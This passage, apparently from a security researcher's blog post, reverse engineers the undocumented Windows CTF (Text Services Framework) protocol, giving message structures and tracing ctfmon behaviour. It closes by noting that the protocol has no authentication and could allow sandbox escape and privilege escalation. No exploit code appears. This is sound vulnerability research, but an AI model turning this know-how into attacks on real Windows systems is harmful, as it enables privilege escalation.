&lt;div class=&quot;c3&quot;&gt;I wrote a test case to verify it really is as simple as it looks. If I send every possible message to a privileged window from an unprivileged process, the list should match the whitelist in &lt;span class=&quot;c29&quot;&gt;win32k!IsMessageAlwaysAllowedAcrossIL&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt; and I can move onto something else.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;Ah, I was so naive. The code I used is available &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://gist.github.com/taviso/767fc1dfbe5632368081de10fb7eeee9&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;, and a picture of the output is below.&lt;/span&gt;&lt;/div&gt;

&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://4.bp.blogspot.com/-yMJ8jDbTkdk/XPmyr1VxZ0I/AAAAAAAAIoA/46X3XqW5GWkrLgh0UqW_bR0W5lbgKYw1gCLcBGAs/s1600/image11.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://4.bp.blogspot.com/-yMJ8jDbTkdk/XPmyr1VxZ0I/AAAAAAAAIoA/46X3XqW5GWkrLgh0UqW_bR0W5lbgKYw1gCLcBGAs/s1600/image11.png&quot; title=&quot;&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.s4ngrr4kepdy&quot;&gt;&lt;span class=&quot;c21&quot;&gt;What the...?! Scanning which messages are allowed across IL produces unexpected results.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;The tool showed that unprivileged applications were allowed to send messages in the &lt;span class=&quot;c29&quot;&gt;0xCNNN&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt; range to most of the applications I tested, even simple applications like Notepad. I had no idea message numbers even went that high!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;Message numbers use predefined ranges, the system messages are in the range &lt;span class=&quot;c29&quot;&gt;0 - 0x3FF&lt;/span&gt;. Then there’s the &lt;span class=&quot;c29&quot;&gt;WM_USER &lt;/span&gt;and &lt;span class=&quot;c29&quot;&gt;WM_APP &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;ranges that applications can use for their own purposes.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;This is the first time I’d seen a message outside of those ranges, so I had to look it up.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;The following are the ranges of message numbers.&lt;/span&gt;&lt;/div&gt;
&lt;br/&gt;&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c50&quot;&gt;&lt;td class=&quot;c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;td class=&quot;c71&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c28&quot;&gt;&lt;td class=&quot;c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c33 c36 c37&quot;&gt;0 through WM_USER –1&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;td class=&quot;c72&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;Messages reserved for use by the system.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c28&quot;&gt;&lt;td class=&quot;c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;WM_USER through 0x7FFF&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;td class=&quot;c72&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;Integer messages for use by private window classes.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c28&quot;&gt;&lt;td class=&quot;c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;td class=&quot;c72&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;Messages available for use by applications.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c28&quot;&gt;&lt;td class=&quot;c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;0xC000 through 0xFFFF&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;td class=&quot;c72&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;String messages for use by applications.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c28&quot;&gt;&lt;td class=&quot;c68&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;Greater than 0xFFFF&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;td class=&quot;c67&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c16&quot;&gt;&lt;span class=&quot;c42 c36 c43&quot;&gt;Reserved by the system.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;


&lt;div class=&quot;c3&quot;&gt;The documentation pointed me to &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-registerwindowmessagea&quot;&gt;RegisterWindowMessage()&lt;/a&gt;&lt;/span&gt;, which lets two applications agree on a message number when they know a shared string. I suppose the API uses &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/dataxchg/about-atom-tables&quot;&gt;Atoms&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;, a standard Windows facility.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;My first theory was that &lt;span class=&quot;c29&quot;&gt;RegisterWindowMessage()&lt;/span&gt; automatically calls &lt;span class=&quot;c29&quot;&gt;ChangeWindowMessageFilterEx()&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;. That would explain my results, and be useful information for future audits.... but I tested it and that didn’t work!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c25 c60&quot;&gt;&lt;span class=&quot;c77 c2 c78&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;c55 c2 c70&quot;&gt;Something must be explicitly allowing these messages!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;I needed to find the code responsible to figure out what is going on.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;Tracking down the culprit...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;I put a breakpoint on &lt;span class=&quot;c29&quot;&gt;USER32!RegisterWindowMessageW&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;, and waited for it to return one of the message numbers I was looking for. When the breakpoint hits, I can look at the stack and figure out what code is responsible for this.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.1jma24rwegx&quot;&gt;&lt;span class=&quot;c21&quot;&gt;So....  wtf is ctf? A debugging session trying to find who is responsible for these windows messages.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;The debugger showed that while the kernel is creating a new window on behalf of a process, it will invoke a callback that loads a module called “&lt;span class=&quot;c29&quot;&gt;MSCTF&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;”. That library is the one creating these messages and changing the message filters.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c2 c12&quot;&gt;The hidden depths reveal...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;It turns out CTF&lt;sup&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html#ftnt2&quot; id=&quot;ftnt_ref2&quot;&gt;[2]&lt;/a&gt;&lt;/sup&gt; is part of the Windows &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/TSF/text-services-framework&quot;&gt;Text Services Framework&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;. The TSF manages things like input methods, keyboard layouts, text processing and so on.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;If you change between keyboard layouts or regions, use an IME like Pinyin or alternative input methods like handwriting recognition then that is using CTF.&lt;/span&gt;&lt;/div&gt;


&lt;div class=&quot;c3&quot;&gt;
&lt;div class=&quot;separator&quot;&gt;&lt;span&gt;&lt;img alt=&quot;The TIP of the iceberg...&quot; height=&quot;166&quot; src=&quot;https://3.bp.blogspot.com/-mO9r0o-wyNE/XPm0igpqr_I/AAAAAAAAIpU/Y4hLLuyIYdI0x1FxKLY4VL_B47RYJaa2gCLcBGAs/s200/image3.jpg&quot; title=&quot;&quot; width=&quot;200&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;br/&gt;The only discussion on the security of Text Services I could find online was this snippet from the “&lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://docs.microsoft.com/en-us/windows/desktop/TSF/new-features-in-tsf&quot;&gt;New Features&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;” page:&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c25 c56&quot;&gt;&lt;span class=&quot;c83 c2&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;c83 c78 c2&quot;&gt;The security and robustness of TSF have been substantially improved, to reduce the likelihood of a hostile program being able to access the stack, heap, or other secure memory locations.&lt;/span&gt;&lt;span class=&quot;c36 c2 c69&quot;&gt;“&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;I’m glad the security has been substantially improved, but it really doesn’t inspire much confidence that those things used to be possible. I decided it would be worth it to spend a couple of weeks reverse engineering CTF to understand the security properties.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;So... how does it all work?&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;You might have noticed the ctfmon service in task manager, it is responsible for notifying applications about changes in keyboard layout or input methods. The kernel forces applications to connect to the ctfmon service when they start, and then exchange messages with other clients and receive notifications from the service.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span&gt;&lt;img alt=&quot;&quot; src=&quot;https://4.bp.blogspot.com/-nb0_DKIC_CQ/XPm40hSvgsI/AAAAAAAAIp8/uXuYqskSndwOqpXopQyJtqaX_H99UBMIQCLcBGAs/s1600/image13.png&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c21&quot;&gt;A ctfmon process is started for each Desktop and session.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;Consider the example of an IME, &lt;span class=&quot;c2&quot;&gt;Input Method Editor&lt;/span&gt;, like &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://en.wikipedia.org/wiki/Microsoft_Pinyin_IME&quot;&gt;Microsoft Pinyin&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;. If you set your language to Chinese in Windows, you will get Microsoft Pinyin installed by default.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span&gt;&lt;img alt=&quot;&quot; src=&quot;https://3.bp.blogspot.com/-nse6IZX09BQ/XPm5MTtEdDI/AAAAAAAAIqE/ZfQUw1rNhrshr8qetQTpgQzJdSg6fHxiACLcBGAs/s1600/image1.png&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c21&quot;&gt;This is what Microsoft Pinyin looks like.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Other regions have other IMEs, if your language is set to Japanese you get Microsoft JP-IME, and so on.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;These IMEs require another process to see what is being entered on the keyboard, and to change and modify the text, and the ctf service is responsible for arranging this. An IME application is an example of an out-of-process TIP, &lt;span class=&quot;c2&quot;&gt;Text Input Processor&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;. There are other types of TIP, and CTF supports many.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;Understanding the CTF Protocol...&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;A CTF monitor service is spawned for each new desktop and session, and creates an ALPC port called &lt;span class=&quot;c29&quot;&gt;\BaseNamedObjects\msctf.server&amp;lt;DesktopName&amp;gt;&amp;lt;SessionId&amp;gt;&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span&gt;&lt;img alt=&quot;&quot; src=&quot;https://2.bp.blogspot.com/-kv1Im08cTbs/XPm5ZRJyBiI/AAAAAAAAIqI/A7GV3LGKZM8ZJTLVtzBU-RrYTonQ7p8fQCLcBGAs/s1600/image14.png&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.a0nec3lf1tur&quot;&gt;&lt;span class=&quot;c21&quot;&gt;The ctf server ALPC port contains the desktop name and the session id.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

&lt;div class=&quot;c3&quot;&gt;When any process creates a window, the kernel invokes a callback, &lt;span class=&quot;c29&quot;&gt;USER32!&lt;/span&gt;&lt;span class=&quot;c29&quot;&gt;CtfHookProcWorker&lt;/span&gt;&lt;span class=&quot;c29&quot;&gt;, &lt;/span&gt;that automatically loads the CTF client&lt;span class=&quot;c0&quot;&gt;. The client connects to the ALPC port, and reports its HWND, thread and process id.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c29&quot;&gt;typedef struct _CTF_CONNECT_MSG {&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    PORT_MESSAGE Header;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD ProcessId;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD ThreadId;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD TickCount;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD ClientFlags;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c29&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c29&quot;&gt;union&lt;/span&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt; {&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;        UINT64 QuadWord;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;        HWND WindowId;&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;} CTF_CONNECT_MSG, *PCTF_CONNECT_MSG;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.a9xfubaceih1&quot;&gt;&lt;span class=&quot;c21&quot;&gt;This is the initial handshake message clients send to connect to the CTF session. The protocol is entirely undocumented, and these structures were reverse engineered.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;

&lt;div class=&quot;c3&quot;&gt;The server continuously waits for messages from clients, but clients only look for messages when notified via &lt;span class=&quot;c29&quot;&gt;PostMessage().&lt;/span&gt; This is the reason that clients call &lt;span class=&quot;c29&quot;&gt;RegisterWindowMessage()&lt;/span&gt;&lt;span class=&quot;c0&quot;&gt; on startup!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Clients can send commands to the monitor, or ask the monitor to forward commands to other clients by specifying the destination thread id.&lt;/span&gt;&lt;/div&gt;

&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD DstThreadId;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD Result;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c29&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c29&quot;&gt;union&lt;/span&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt; {&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;        };&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;        DWORD Params[3];&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;} CTF_MSGBASE, *PCTF_MSGBASE;&lt;/span&gt;&lt;/div&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.y4fw5c8fye97&quot;&gt;&lt;span class=&quot;c21&quot;&gt;Messages can be sent to any connected thread, or the monitor itself by setting the destination to thread zero. Parameters can be appended, or if you only need some integers, you can include them in the message.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;There are dozens of commands that can be sent, many involve sending or receiving data or instantiating COM objects. Many commands require parameters, so the CTF protocol has a complex type marshaling and unmarshaling system.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;typedef struct _CTF_MARSHAL_PARAM {&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD Start;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD Size;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD TypeFlags;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD Reserved;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;} CTF_MARSHAL_PARAM, *PCTF_MARSHAL_PARAM;&lt;/span&gt;&lt;/div&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.sbey6xpgaber&quot;&gt;&lt;span class=&quot;c21&quot;&gt;Marshalled parameters are appended to messages.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;If you want to send marshalled data to an instantiated COM object, the monitor will “proxy” it for you. You simply prepend a &lt;span class=&quot;c29&quot;&gt;PROXY_SIGNATURE &lt;/span&gt;&lt;span class=&quot;c0&quot;&gt;structure that describes which COM object you want it forwarded to.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;typedef struct _CTF_PROXY_SIGNATURE {&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    GUID Interface;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c29&quot;&gt;    DWORD &lt;/span&gt;&lt;span class=&quot;c29&quot;&gt;FunctionIndex&lt;/span&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD StubId;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD Timestamp;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD field_1C; // I've never seen these fields used&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD field_20;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c33 c36 c29&quot;&gt;    DWORD field_24;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span class=&quot;c29&quot;&gt;} CTF_PROXY_SIGNATURE, *PCTF_PROXY_SIGNATURE;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7 c32 subtitle&quot; id=&quot;h.6kc2xw6uyy6y&quot;&gt;&lt;span class=&quot;c21&quot;&gt;You can even call methods on COM objects.&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;div class=&quot;c3&quot;&gt;Suffice to say, CTF is vast and complex. The CTF system was most likely designed for LPC in Windows NT and bolted onto ALPC when it became available in Vista and later. The code is clearly dated&lt;span class=&quot;c0&quot;&gt; with many legacy design decisions.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;In fact, the earliest version of MSCTF I've been able to find was from the 2001 release of &lt;span class=&quot;c14&quot;&gt;&lt;a class=&quot;c22&quot; href=&quot;https://en.wikipedia.org/wiki/Microsoft_Office_XP&quot;&gt;Office XP&lt;/a&gt;&lt;/span&gt;, which even supported Windows 98.&lt;span class=&quot;c0&quot;&gt; It was later included with Windows XP as part of the base operating system.&lt;/span&gt;&lt;/div&gt;


&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c12 c2&quot;&gt;Is there any attack surface?&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Firstly, there is no access control whatsoever!&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;Any application, any user - even&lt;span class=&quot;c0&quot;&gt; sandboxed processes - can connect to any CTF session. Clients are expected to report their thread id, process id and HWND, but there is no authentication involved and you can simply lie.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;&lt;span class=&quot;c0&quot;&gt;Secondly, there is nothing stopping you pretending to be a CTF service and getting other applications - even privileged applications - to connect to you.&lt;/span&gt;&lt;/div&gt;

&lt;div class=&quot;c3&quot;&gt;Even when working as intended, CTF could allow escaping from sandboxes and escalating privileges&lt;span class=&quot;c0&quot;&gt;. This convinced me that my time would be well spent reverse engineering the protocol.&lt;/span&gt;&lt;/div&gt;


&lt;table class=&quot;c38&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;c15&quot;&gt;&lt;td class=&quot;c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
&lt;div class=&quot;c7&quot;&gt;&lt;span&gt;&lt;img alt=&quot;&quot; src=&quot;https://1.bp.blogspot.com/-kISK6S4Qrx8/XPm64OpXhzI/AAAAAAAAIq8/VHzK9QieS6wG6S3JsmQz--uA3fOvMrVpwCLcBGAs/s1600/image15.png&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/td&gt;
